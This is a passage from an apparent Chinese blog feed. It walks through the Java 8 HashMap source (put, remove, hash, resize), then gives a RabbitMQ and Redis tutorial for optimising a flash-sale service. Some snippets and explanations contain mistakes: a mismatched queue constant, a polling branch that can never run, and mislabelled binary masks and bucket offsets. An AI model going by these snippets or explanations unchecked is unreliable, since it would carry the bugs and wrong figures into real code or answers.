else &#123; //采用循环遍历的方式，判断链中是否有重复的key for (int binCount = 0; ; ++binCount) &#123; //到了链尾还没找到重复的key，则说明HashMap没有包含该键 if ((e = p.next) == null) &#123; //创建一个新节点插入到尾部 p.next = newNode(hash, key, value, null); //如果链的长度大于TREEIFY_THRESHOLD这个临界值，则把链变为红黑树 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; //找到了重复的key if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; //这里表示在上面的操作中找到了重复的键，所以这里把该键的值替换为新值 if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; //判断是否需要进行扩容 if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null;&#125; 1234567891011121314151617181920final void treeifyBin(Node&lt;K,V&gt;[] tab, int hash) &#123; int n, index; Node&lt;K,V&gt; e; if (tab == null || (n = tab.length) &lt; MIN_TREEIFY_CAPACITY) resize(); else if ((e = tab[index = (n - 1) &amp; hash]) != null) &#123; TreeNode&lt;K,V&gt; hd = null, tl = null; do &#123; TreeNode&lt;K,V&gt; p = replacementTreeNode(e, null); if (tl == null) hd = p; else &#123; p.prev = tl; tl.next = p; &#125; tl = p; &#125; while ((e = e.next) != null); if ((tab[index] = hd) != null) hd.treeify(tab); &#125;&#125; put方法比较复杂，实现步骤大致如下： 1、先通过hash值计算出key映射到哪个桶。 2、如果桶上没有碰撞冲突，则直接插入。 3、如果出现碰撞冲突了，则需要处理冲突： （1）如果该桶使用红黑树处理冲突，则调用红黑树的方法插入。 （2）否则采用传统的链式方法插入。如果链的长度到达临界值，则把链转变为红黑树。 4、如果桶中存在重复的键，则为该键替换新值。 5、如果size大于阈值，则进行扩容。 6.5 remove方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//remove方法的具体实现在removeNode方法中，所以我们重点看下面的removeNode方法public V remove(Object key) &#123; Node&lt;K,V&gt; e; return (e = removeNode(hash(key), key, null, false, true)) == null ? null : e.value;&#125;final Node&lt;K,V&gt; removeNode(int hash, Object key, Object value, boolean matchValue, boolean movable) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, index; //如果当前key映射到的桶不为空 if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (p = tab[index = (n - 1) &amp; hash]) != null) &#123; Node&lt;K,V&gt; node = null, e; K k; V v; //如果桶上的节点就是要找的key，则直接命中 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) node = p; else if ((e = p.next) != null) &#123; //如果是以红黑树处理冲突，则构建一个树节点 if (p instanceof TreeNode) node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key); //如果是以链式的方式处理冲突，则通过遍历链表来寻找节点 else &#123; do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) &#123; node = e; break; &#125; p = e; &#125; while ((e = e.next) != null); &#125; &#125; //比对找到的key的value跟要删除的是否匹配 if (node != null &amp;&amp; (!matchValue || (v = node.value) == value || (value != null &amp;&amp; value.equals(v)))) &#123; //通过调用红黑树的方法来删除节点 if (node instanceof TreeNode) ((TreeNode&lt;K,V&gt;)node).removeTreeNode(this, tab, movable); //使用链表的操作来删除节点 else if (node == p) tab[index] = node.next; else p.next = node.next; ++modCount; --size; afterNodeRemoval(node); return node; &#125; &#125; return null;&#125; 6.6 hash方法(确定哈希桶数组索引位置)不管增加、删除、查找键值对，定位到哈希桶数组的位置都是很关键的第一步。前面说过HashMap的数据结构是数组和链表的结合，所以我们当然希望这个HashMap里面的元素位置尽量分布均匀些，尽量使得每个位置上的元素数量只有一个，那么当我们用hash算法求得这个位置的时候，马上就可以知道对应位置的元素就是我们要的，不用遍历链表，大大优化了查询的效率。HashMap定位数组索引位置，直接决定了hash方法的离散性能。 注意get方法和put方法源码中都需要先计算key映射到哪个桶上，然后才进行之后的操作，计算的主要代码如下： 1(n - 1) &amp; hash 上面代码中的n指的是哈希表的大小，hash指的是key的哈希值，hash是通过下面这个方法计算出来的，采用了二次哈希的方式，其中key的hashCode方法是一个native方法： 123456static final int hash(Object key) &#123; //jdk1.8 &amp; jdk1.7 int h; // h = key.hashCode() 为第一步 取hashCode值 // h ^ (h &gt;&gt;&gt; 16) 为第二步 高位参与运算 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 对于任意给定的对象，只要它的hashCode()返回值相同，那么程序调用方法一所计算得到的Hash码值总是相同的。我们首先想到的就是把hash值对数组长度取模运算，这样一来，元素的分布相对来说是比较均匀的。但是，模运算的消耗还是比较大的，在HashMap中是这样做的：调用方法二来计算该对象应该保存在table数组的哪个索引处。 这个方法非常巧妙，它通过h &amp; (table.length -1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h&amp; (length-1)运算等价于对length取模，也就是h%length，但是&amp;比%具有更高的效率。 在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。 6.7 resize方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table; int oldCap = (oldTab == null) ? 0 : oldTab.length; int oldThr = threshold; int newCap, newThr = 0; //计算扩容后的大小 if (oldCap &gt; 0) &#123; //如果当前容量超过最大容量，则无法进行扩容 if (oldCap &gt;= MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return oldTab; &#125; //没超过最大值则扩为原来的两倍 else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr &lt;&lt; 1; // double threshold &#125; else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else &#123; // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); &#125; if (newThr == 0) &#123; float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; //新的resize阈值 threshold = newThr; //创建新的哈希表 @SuppressWarnings(&#123;"rawtypes","unchecked"&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123; //遍历旧哈希表的每个桶，重新计算桶里元素的新位置 for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123; oldTab[j] = null; //如果桶上只有一个键值对，则直接插入 if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; //如果是通过红黑树来处理冲突的，则调用相关方法把树分离开 else if (e instanceof TreeNode) ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); //如果采用链式处理冲突 else &#123; // preserve order Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; //通过上面讲的方法来计算节点的新位置 do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab;&#125; HashMap在进行扩容时，使用的rehash方式非常巧妙，因为每次扩容都是翻倍，与原来计算（n-1）&amp;hash的结果相比，只是多了一个bit位，所以节点要么就在原来的位置，要么就被分配到“原位置+旧容量”这个位置。 例如，原来的容量为32，那么应该拿hash跟31（0x11111）做与操作；在扩容扩到了64的容量之后，应该拿hash跟63（0x111111）做与操作。新容量跟原来相比只是多了一个bit位，假设原来的位置在23，那么当新增的那个bit位的计算结果为0时，那么该节点还是在23；相反，计算结果为1时，则该节点会被分配到23+31的桶上。 正是因为这样巧妙的rehash方式，保证了rehash之后每个桶上的节点数必定小于等于原来桶上的节点数，即保证了rehash之后不会出现更严重的冲突。 6.8 针对扩容，这里需要探讨一下java8对于扩容的优化。下面举个例子说明下扩容过程。假设了我们的hash算法就是简单的用key mod 一下表的大小（也就是数组的长度）。其中的哈希桶数组table的size=2， 所以key = 3、7、5，put顺序依次为 5、7、3。在mod 2以后都冲突在table[1]这里了。这里假设负载因子 loadFactor=1，即当键值对的实际大小size 大于 table的实际大小时进行扩容。接下来的三个步骤是哈希桶数组 resize成4，然后所有的Node重新rehash的过程。 下面我们讲解下JDK1.8做了哪些优化。经过观测可以发现，我们使用的是2次幂的扩展(指长度扩为原来2倍)，所以，元素的位置要么是在原位置，要么是在原位置再移动2次幂的位置。看下图可以明白这句话的意思，n为table的长度，图（a）表示扩容前的key1和key2两种key确定索引位置的示例，图（b）表示扩容后key1和key2两种key确定索引位置的示例，其中hash1是key1对应的哈希与高位运算结果。 元素在重新计算hash之后，因为n变为2倍，那么n-1的mask范围在高位多1bit(红色)，因此新的index就会发生这样的变化： 因此，我们在扩充HashMap的时候，不需要像JDK1.7的实现那样重新计算hash，只需要看看原来的hash值新增的那个bit是1还是0就好了，是0的话索引没变，是1的话索引变成“原索引+oldCap”. 7. 总结按照原来的拉链法来解决冲突，如果一个桶上的冲突很严重的话，是会导致哈希表的效率降低至O（n），而通过红黑树的方式，可以把效率改进至O（logn）。相比链式结构的节点，树型结构的节点会占用比较多的空间，所以这是一种以空间换时间的改进方式。 参考： https://zhuanlan.zhihu.com/p/21673805 http://blog.csdn.net/u013124587/article/details/52649867]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6.服务级高并发秒杀优化（RabbitMQ+接口优化）]]></title>
    <url>%2F2018%2F07%2F21%2F6.%E6%9C%8D%E5%8A%A1%E7%BA%A7%E9%AB%98%E5%B9%B6%E5%8F%91%E7%A7%92%E6%9D%80%E4%BC%98%E5%8C%96%EF%BC%88RabbitMQ%2B%E6%8E%A5%E5%8F%A3%E4%BC%98%E5%8C%96%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在服务端用redis预减库存和消息队列进行优化。 1. 安装RabbitMQlinux下的安装没什么可说的，因为本机懒得重装虚拟机了，所以就下载了windows版本进行安装。 erlang下载地址：http://www.erlang.org/download.html rabbitMQ下载：http://www.rabbitmq.com/download.html 直接下载安装即可。 因为想用可视化界面监控消息，所以先激活这个功能。 12//到rabbitMQ安装目录的sbin目录下启动cmd黑窗口E:\software\RabbitMQServer\rabbitmq_server-3.6.5\sbin&gt;rabbitmq-plugins.bat enable rabbitmq_management 然后重启rabbitMQ服务。输入网址：http://localhost:15672/。 使用默认用户guest/guest进入网页端控制台。 2. rabbitMQ基本原理和使用rabbitMQ原理 Broker：简单来说就是消息队列服务器实体。 Exchange：消息交换机，它指定消息按什么规则，路由到哪个队列。 Queue：消息队列载体，每个消息都会被投入到一个或多个队列。 Binding：绑定，它的作用就是把exchange和queue按照路由规则绑定起来。 Routing Key：路由关键字，exchange根据这个关键字进行消息投递。 vhost：虚拟主机，一个broker里可以开设多个vhost，用作不同用户的权限分离。 producer：消息生产者，就是投递消息的程序。 consumer：消息消费者，就是接受消息的程序。 channel：消息通道，在客户端的每个连接里，可建立多个channel，每个channel代表一个会话任务。 消息队列的使用过程大概如下 客户端连接到消息队列服务器，打开一个channel。 客户端声明一个exchange，并设置相关属性。 客户端声明一个queue，并设置相关属性。 客户端使用routing key，在exchange和queue之间建立好绑定关系。 客户端投递消息到exchange。 总结：exchange接收到消息后，就根据消息的key和已经设置的binding，进行消息路由，将消息投递到一个或多个队列里。 Direct交换机完全根据key进行投递的叫做Direct交换机，例如，绑定时设置了routing key为”abc”，那么客户端提交的消息，只有设置了key为”abc”的才会投递到队列。 所有发送到Direct Exchange的消息被转发到RouteKey中指定的Queue。 Direct模式,可以使用rabbitMQ自带的Exchange：default Exchange 。所以不需要将Exchange进行任何绑定(binding)操作 。消息传递时，RouteKey必须完全匹配，才会被队列接收，否则该消息会被抛弃。 Topic交换机对key进行模式匹配后进行投递的叫做Topic交换机。*（星号）可以代替一个任意标识符 ；#（井号）可以代替零个或多个标识符。 在上图例子中，我们发送描述动物的消息。消息会转发给包含3个单词（2个小数点）的路由键绑定的队列中。绑定键中的第一个单词描述的是速度，第二个是颜色，第三个是物种：“速度.颜色.物种”。我们创建3个绑定：Q1绑定键是“.orange.”，Q2绑定键是“..rabbit”，Q3绑定键是“lazy.#”。这些绑定可以概括为：Q1只对橙色的动物感兴趣。Q2则是关注兔子和所有懒的动物。 所有发送到Topic Exchange的消息被转发到所有关心RouteKey中指定Topic的Queue上， 所有发送到Topic Exchange的消息被转发到所有关心RouteKey中指定Topic的Queue上， Exchange 将RouteKey 和某Topic 进行模糊匹配。此时队列需要绑定一个Topic。可以使用通配符进行模糊匹配，符号“#”匹配一个或多个词，符号“”匹配不多不少一个词。因此“log.#”能够匹配到“log.info.oa”，但是“log.” 只会匹配到“log.error”。 Fanout交换机还有一种不需要key的，叫做Fanout交换机，它采取广播模式，一个消息进来时，投递到与该交换机绑定的所有队列。 所有发送到Fanout Exchange的消息都会被转发到与该Exchange 绑定(Binding)的所有Queue上。 Fanout Exchange 不需要处理RouteKey 。只需要简单的将队列绑定到exchange 上。这样发送到exchange的消息都会被转发到与该交换机绑定的所有队列上。类似子网广播，每台子网内的主机都获得了一份复制的消息。 所以，Fanout Exchange 转发消息是最快的。 Headers交换机首部交换机是忽略routing_key的一种路由方式。路由器和交换机路由的规则是通过Headers信息来交换的，这个有点像HTTP的Headers。将一个交换机声明成首部交换机，绑定一个队列的时候，定义一个Hash的数据结构，消息发送的时候，会携带一组hash数据结构的信息，当Hash的内容匹配上的时候，消息就会被写入队列。 绑定交换机和队列的时候，Hash结构中要求携带一个键“x-match”，这个键的Value可以是any或者all，这代表消息携带的Hash是需要全部匹配(all)，还是仅匹配一个键(any)就可以了。相比直连交换机，首部交换机的优势是匹配的规则不被限定为字符串(string)。 持久化RabbitMQ支持消息的持久化，也就是数据写在磁盘上，为了数据安全考虑，我想大多数用户都会选择持久化。消息队列持久化包括3个部分： exchange持久化，在声明时指定durable =&gt; 1 queue持久化，在声明时指定durable =&gt; 1 消息持久化，在投递时指定delivery_mode =&gt; 2（1是非持久化） 如果exchange和queue都是持久化的，那么它们之间的binding也是持久化的。如果exchange和queue两者之间有一个持久化，一个非持久化，就不允许建立绑定。 3. rabbitMQ-Direct交换机这种模式是最简单的模式，就发送一串字符串，这个字符串为key，接收的时候也完全以这个字符串本来来确定，不需要绑定任何exchange，使用默认的就行。我们以这个模式开始在原来的项目上继续集成。 首先是引入依赖： 12345&lt;!--rabbitMQ--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;&lt;/dependency&gt; appilication.yml: 123456789101112131415161718192021spring: rabbitmq: host: 127.0.0.1 port: 5672 username: guest password: guest virtual-host: / listener: simple: concurrency: 10 max-concurrency: 10 prefetch: 1 auto-startup: true default-requeue-rejected: true template: retry: enabled: true initial-interval: 1000 max-attempts: 3 max-interval: 10000 multiplier: 1.0 rabbitMQ配置类MQConfig： 123456789@Configurationpublic class MQConfig &#123; //MQ name public static final String DIRECT_QUEUE_NAME = "queue"; @Bean public Queue queue()&#123; return new Queue(QUEUE_NAME,true); &#125;&#125; 发送者MQSender： 123456789101112@Service@Slf4jpublic class MQSender &#123; @Autowired private AmqpTemplate amqpTemplate; public void send(Object message)&#123; amqpTemplate.convertAndSend(MQConfig.DIRECT_QUEUE_NAME,message); log.info("send:&#123;&#125;",message); &#125;&#125; 接收者MQReceiver： 123456789@Service@Slf4jpublic class MQReceiver &#123; @RabbitListener(queues = MQConfig.DIRECT_QUEUE_NAME) public void receive(String message)&#123; log.info("receive:&#123;&#125;",message); &#125;&#125; 这样，就完成了最简单的一个字符串的发送-接受。可以在controller中随便测试一下： 12345678910111213@Controller@RequestMapping("/test")public class TestController &#123; @Autowired private MQSender mqSender; @RequestMapping("/mq") @ResponseBody public String mq()&#123; mqSender.send("hello world"); return "success"; &#125;&#125; 4. rabbitMQ-Topic交换机 这个模式正如上面所言，是可以匹配通配符的，显然更加灵活，这里用程序测试一下这个模式效果。 MQConfig： 先来几个常量： 12345678910//queue1名字public static final String TOPIC_QUEUE_NAME1 = "topic.queue1";//queue2名字public static final String TOPIC_QUEUE_NAME2 = "topic.queue2";//交换机名字public static final String TOPIC_EXCHANGE_NAME = "topicExchange";//key等于topic.key1的，后面将配置为只被queue1接收private static final String TOPIC_KEY_ROUTE1 = "topic.key1";//key匹配topic.#的都被接收进queue2private static final String TOPIC_KEY_ROUTE2 = "topic.#"; 下面配置几个bean： 注：带有 @Configuration 的注解类表示这个类可以使用 Spring IoC 容器作为 bean 定义的来源。@Bean 注解告诉 Spring，一个带有 @Bean 的注解方法将返回一个对象，该对象应该被注册为在 Spring应用程序上下文中的 bean。 123456789101112131415161718192021222324//创建两个QUEUE对象queue1，queue2的bean被spring管理@Beanpublic Queue topicQueue1()&#123; return new Queue(TOPIC_QUEUE_NAME1,true);&#125;@Beanpublic Queue topicQueue2()&#123; return new Queue(TOPIC_QUEUE_NAME2,true);&#125;//交换机@Beanpublic TopicExchange topicExchange()&#123; return new TopicExchange(TOPIC_EXCHANGE_NAME);&#125;//queue1--交换机--匹配规则1@Beanpublic Binding topicBinding1()&#123; return BindingBuilder.bind(topicQueue1()).to(topicExchange()).with(TOPIC_KEY_ROUTE1);&#125;//queue2--交换机--匹配规则2@Beanpublic Binding topicBinding2()&#123; return BindingBuilder.bind(topicQueue2()).to(topicExchange()).with(TOPIC_KEY_ROUTE2);&#125; MQSender： 12345678//消息1与topic.key1和topic.#都匹配；//消息2与topic.key1不匹配，只与topic.#匹配，那么只能被queue2接收public void sendTopic(Object message)&#123; log.info("send topic msg:&#123;&#125;",message); amqpTemplate.convertAndSend(MQConfig.TOPIC_EXCHANGE_NAME,"topic.key1",message+"--1"); amqpTemplate.convertAndSend(MQConfig.TOPIC_EXCHANGE_NAME,"topic.key2",message+"--2");&#125; MQReceiver： 123456789@RabbitListener(queues = MQConfig.TOPIC_QUEUE_NAME1)public void receiveTopic1(String message)&#123; log.info("topic queue1 receive:&#123;&#125;",message);&#125;@RabbitListener(queues = MQConfig.TOPIC_QUEUE_NAME2)public void receiveTopic2(String message)&#123; log.info("topic queue2 receive:&#123;&#125;",message);&#125; 最后测试一把： 123456@RequestMapping("/mq/topic")@ResponseBodypublic String mq_topic()&#123; mqSender.sendTopic("hello world"); return "success";&#125; 运行结果： 12342018-05-26 18:59:40.281 INFO 9920 --- [nio-8080-exec-1] com.swg.miaosha.mq.MQSender : send topic msg:hello world2018-05-26 18:59:40.303 INFO 9920 --- [cTaskExecutor-1] com.swg.miaosha.mq.MQReceiver : topic queue2 receive:hello world--12018-05-26 18:59:40.303 INFO 9920 --- [TaskExecutor-10] com.swg.miaosha.mq.MQReceiver : topic queue2 receive:hello world--22018-05-26 18:59:40.303 INFO 9920 --- [cTaskExecutor-1] com.swg.miaosha.mq.MQReceiver : topic queue1 receive:hello world--1 运行结果与初期的分析结果一致。 5. rabbitMQ-Fanout交换机这种就是广播模式，即所有的绑定到指定的exchange上的queue都可以接收消息。 MQConfig： 12345678910111213141516171819202122232425public static final String FANOUT_EXCHANGE_NAME = "fanoutExchage";public static final String FANOUT_QUEUE_NAME1 = "fanout.queue1";public static final String FANOUT_QUEUE_NAME2 = "fanout.queue2";@Bean public Queue fanoutQueue1()&#123; return new Queue(FANOUT_QUEUE_NAME1,true);&#125;@Beanpublic Queue fanoutQueue2()&#123; return new Queue(FANOUT_QUEUE_NAME2,true);&#125;@Beanpublic FanoutExchange fanoutExchange()&#123; return new FanoutExchange(FANOUT_EXCHANGE_NAME);&#125;@Beanpublic Binding fanoutBinding1()&#123; return BindingBuilder.bind(fanoutQueue1()).to(fanoutExchange());&#125;@Beanpublic Binding fanoutBinding2()&#123; return BindingBuilder.bind(fanoutQueue2()).to(fanoutExchange());&#125; MQSender： 1234public void sendFanout(Object message)&#123; log.info("send fanout msg:&#123;&#125;",message); amqpTemplate.convertAndSend(MQConfig.FANOUT_EXCHANGE_NAME,"",message);&#125; MQReceiver： 123456789@RabbitListener(queues = MQConfig.FANOUT_QUEUE_NAME1)public void receiveFanout1(String message)&#123; log.info("fanout queue1 receive:&#123;&#125;",message);&#125;@RabbitListener(queues = MQConfig.FANOUT_QUEUE_NAME2)public void receiveFanout2(String message)&#123; log.info("fanout queue2 receive:&#123;&#125;",message);&#125; 运行结果： 1232018-05-26 20:03:29.592 INFO 16680 --- [nio-8080-exec-1] com.swg.miaosha.mq.MQSender : send fanout msg:hello world2018-05-26 20:03:29.619 INFO 16680 --- [cTaskExecutor-1] com.swg.miaosha.mq.MQReceiver : fanout queue1 receive:hello world2018-05-26 20:03:29.619 INFO 16680 --- [cTaskExecutor-1] com.swg.miaosha.mq.MQReceiver : fanout queue2 receive:hello world queue1和queue2都接受到了消息。 6. rabbitMQ-Headers交换机MQConfig： 12345678910111213141516171819public static final String HEADERS_EXCHANGE_NAME = "headersExchage";public static final String HEADERS_QUEUE_NAME = "headers.queue";@Beanpublic HeadersExchange headersExchange()&#123; return new HeadersExchange(HEADERS_EXCHANGE_NAME);&#125;@Beanpublic Queue headersQueue()&#123; return new Queue(HEADERS_QUEUE_NAME,true);&#125;//就是说要完全匹配这个Map才能进入queue中发送出去@Beanpublic Binding headersBinding()&#123; Map&lt;String,Object&gt; map = new HashMap&lt;&gt;(); map.put("header1","value1"); map.put("header2","value2"); return BindingBuilder.bind(headersQueue()).to(headersExchange()).whereAll(map).match();&#125; MQSender：12345678910//map要一样public void sendHeaders(Object message)&#123; String msg = RedisService.beanToString(message); log.info("send fanout msg:&#123;&#125;",message); MessageProperties properties = new MessageProperties(); properties.setHeader("header1","value1"); properties.setHeader("header2","value2"); Message obj = new Message(msg.getBytes(),properties); amqpTemplate.convertAndSend(MQConfig.HEADERS_EXCHANGE_NAME,"",obj);&#125; MQReceiver： 1234@RabbitListener(queues = MQConfig.HEADERS_QUEUE_NAME)public void receiveHeaders(byte[] message)&#123; log.info("fanout queue2 receive:&#123;&#125;",new String(message));&#125; 7. 秒杀优化思路：减少数据库访问 系统初始化，把商品库存数量加载到redis 收到请求，redis预减库存，库存不够，直接返回，否则进入3 请求入队，立即返回排队中 请求出队，生成订单，减少库存 客户端轮询，是否秒杀成功 对于之前的秒杀接口do_miaosha： 123456789101112131415161718192021222324@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;Integer&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); //判断库存 GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); if(goodsVo.getStockCount() &lt;= 0)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; //减库存、下订单、写入秒杀订单,需要在一个事务中执行 OrderInfo orderInfo = miaoshaService.miaosha(user,goodsVo); return Result.success(orderInfo);&#125; 这里判断库存是直接从数据库查，因为并发量比较大，存在性能问题。后面秒杀到之后，也不是直接减库存， 而是将其放到消息队列中慢慢交给数据库去调整。 12345678910111213141516171819202122232425262728@RequestMapping(value = "/do_miaosha",method = RequestMethod.POST)@ResponseBodypublic Result&lt;Integer&gt; do_miaosha(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); //1.预减库存进行优化 /*********************************优化1开始*************************************/ long stock = redisService.decr(GoodsKey.getMiaoshaGoodsStock,""+goodsId); if(stock &lt; 0)&#123; return Result.error(CodeMsg.MIAO_SHA_OVER); &#125; /*********************************优化1结束*************************************/ //2.判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return Result.error(CodeMsg.REPEATE_MIAOSHA); &#125; /*********************************优化2开始*************************************/ //3.进入消息队列 MiaoshaMessage message = new MiaoshaMessage(); message.setUser(user); message.setGoodsId(goodsId); sender.sendMiaoshaMessage(message); /*********************************优化2结束*************************************/ return Result.success(0);//排队中&#125; 在消息队列中对消息进行消化： 12345678910111213141516171819202122@RabbitListener(queues = MQConfig.MIAOSHA_QUEUE)public void receive(String message)&#123; log.info("receive message:&#123;&#125;",message); MiaoshaMessage msg = RedisService.stringToBean(message,MiaoshaMessage.class); MiaoshaUser user = msg.getUser(); long goodsId = msg.getGoodsId(); //判断数据库库存是否真的足够 GoodsVo goodsVo = goodsService.getGoodsVoByGoodsId(goodsId); if(goodsVo.getStockCount() &lt;= 0)&#123; return; &#125; //判断是否已经秒杀到了 MiaoshaOrder miaoshaOrder = orderService.getMiaoshaOrderByUserIdGoodsId(user.getId(),goodsId); if(miaoshaOrder != null)&#123; return; &#125; //减库存、下订单、写入秒杀订单,需要在一个事务中执行 OrderInfo orderInfo = miaoshaService.miaosha(user,goodsVo);&#125; 对于controller中的优化1：redis预减库存。那么需要在系统启动的时候将秒杀商品的库存先添加到redis中： 1public class MiaoshaController implements InitializingBean 重写afterPropertiesSet()方法：1234567891011@Overridepublic void afterPropertiesSet() throws Exception &#123; //将秒杀商品的库存全部先存储到redis中 List&lt;GoodsVo&gt; goodsVoList = goodsService.getGoodsVoList(); if(goodsVoList == null)&#123; return; &#125; for(GoodsVo goods:goodsVoList)&#123; redisService.set(GoodsKey.getMiaoshaGoodsStock,""+goods.getId(),goods.getStockCount()); &#125;&#125; 对于前端，这时也要进行修改了，因为点击秒杀商品按键后，这里考虑三种情况：排队等待、失败、成功。那么这里规定-1为失败，0为排队，1为秒杀成功已经写入数据库。 原来的detail.htm中秒杀事件函数： 1234567891011121314151617181920function doMiaosha()&#123; $.ajax(&#123; url:"/miaosha/do_miaosha", type:"POST", data:&#123; goodsId:$("#goodsId").val(), &#125;, success:function(data)&#123; if(data.code == 0)&#123; window.location.href="/order_detail.htm?orderId="+data.data.id; &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;); &#125; 秒杀到商品就直接返回，现在后端改为消息队列，所以需要增加函数进行判断，必要时需要轮询： 12345if(data.code == 0)&#123; window.location.href="/order_detail.htm?orderId="+data.data.id;&#125;else&#123; layer.msg(data.msg);&#125; 所以将其改为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//其他的部分省略...if(data.code == 0)&#123; //window.location.href="/order_detail.htm?orderId="+data.data.id; //秒杀到商品的时候，这个时候不是直接返回成功，后端是进入消息队列，所以前端是轮询结果，显示排队中 getMiaoshaResult($("#goodsId").val());&#125;else&#123; layer.msg(data.msg);&#125;... function getMiaoshaResult(goodsId) &#123; g_showLoading(); $.ajax(&#123; url:"/miaosha/result", type:"GET", data:&#123; goodsId:$("#goodsId").val(), &#125;, success:function(data)&#123; if(data.code == 0)&#123; var result = data.data; //失败--- -1 if(result &lt;= 0)&#123; layer.msg("对不起，秒杀失败！"); &#125; //排队等待，轮询--- 0 else if(result == 0)&#123;//继续轮询 setTimeout(function () &#123; getMiaoshaResult(goodsId); &#125;,50); &#125; //成功---- 1 else &#123; layer.msg("恭喜你，秒杀成功，查看订单?",&#123;btn:["确定","取消"]&#125;, function () &#123; window.location.href="/order_detail.htm?orderId="+result; &#125;, function () &#123; layer.closeAll(); &#125; ); &#125; &#125;else&#123; layer.msg(data.msg); &#125; &#125;, error:function()&#123; layer.msg("客户端请求有误"); &#125; &#125;);&#125; 那么相应地，后台也要增加一个方法：result 123456789@RequestMapping(value = "/result",method = RequestMethod.GET)@ResponseBodypublic Result&lt;Long&gt; result(Model model, MiaoshaUser user, @RequestParam("goodsId") long goodsId)&#123; if(user == null) return Result.error(CodeMsg.SESSION_ERROR); long result = miaoshaService.getMiaoshaResult(user.getId(),goodsId); return Result.success(result);&#125; 那么如何标记状态呢？这就是getMiaoshaResult方法所做的事情。 对于成功的状态判断，很简单，从数据库查，能查到就说明已经秒杀成功，否则就是两种情况：失败或者正在等待生成订单。 对于这两种状态，我们需要用redis来实现，思路是：在系统初始化的时候，redis中设置秒杀商品是否卖完的状态为false—即未卖完； 123456789101112131415public long getMiaoshaResult(Long userId, long goodsId) &#123; MiaoshaOrder orderInfo = orderService.getMiaoshaOrderByUserIdGoodsId(userId,goodsId); if(orderInfo != null)&#123; return orderInfo.getId(); &#125;else&#123; boolean isOver = getGoodsOver(goodsId); if(isOver)&#123; //库存已经没了 return -1; &#125;else&#123; //表示还没入库，继续等待结果 return 0; &#125; &#125;&#125; 